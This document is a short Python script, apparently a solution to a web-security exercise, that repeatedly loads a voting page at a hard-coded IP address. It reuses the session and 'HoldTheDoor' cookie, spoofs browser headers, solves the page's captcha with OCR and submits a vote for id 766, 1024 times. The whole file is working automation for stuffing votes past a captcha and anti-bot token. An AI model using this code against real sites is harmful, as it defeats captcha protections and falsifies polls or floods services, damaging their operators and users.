#!/usr/bin/python3
import requests
from PIL import Image
import pytesseract


for i in range(1024):
    r = requests.get("http://158.69.76.135/level3.php")


    galleta = r.cookies['HoldTheDoor']
    phpss = r.cookies['PHPSESSID']

    headers = {'Host': '158.69.76.135',
            'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; rv:60.0) Gecko/20100101 Firefox/60.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Referer': 'http://158.69.76.135/level3.php',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': 1,
            'Pragma': 'no-cache',
            'Cache-Control': 'no-cache'}



    imgagen = requests.get("http://158.69.76.135/captcha.php", cookies=r.cookies)

    with open("image_name.png", 'wb') as f:
        for chunk in imgagen.iter_content():
            f.write(chunk)

    img = Image.open("image_name.png")
    img.load()
    text = pytesseract.image_to_string(img)

    payload = {'id': 766, 'holdthedoor': 'Submit', 'key': galleta, 'captcha': text}

    r1 = requests.post("http://158.69.76.135/level3.php", data=payload,
                    cookies={'HoldTheDoor': galleta, 'PHPSESSID': phpss}, headers=headers)
